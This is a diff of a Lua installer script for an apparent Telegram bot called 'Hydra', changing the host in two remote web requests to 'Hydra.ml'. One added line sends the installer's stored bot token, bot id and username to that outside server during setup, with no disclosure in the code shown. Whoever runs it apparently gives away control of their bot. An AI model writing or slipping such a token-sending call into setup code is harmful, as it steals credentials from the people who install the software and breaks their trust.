@@ -38,7 +38,7 @@ if not database:get(Server_Hydra.."UserName_Hydra") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://hydra-net/info/?user="..UserName)
+local Get_Info = http.request("http://Hydra.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Hydra_Info()
 Create_Info(database:get(Server_Hydra.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
-http.request("http://hydra-net/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
+http.request("http://Hydra.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
 local RunHydra = io.open("Hydra", 'w')
 RunHydra:write([[
 #!/usr/bin/env bash
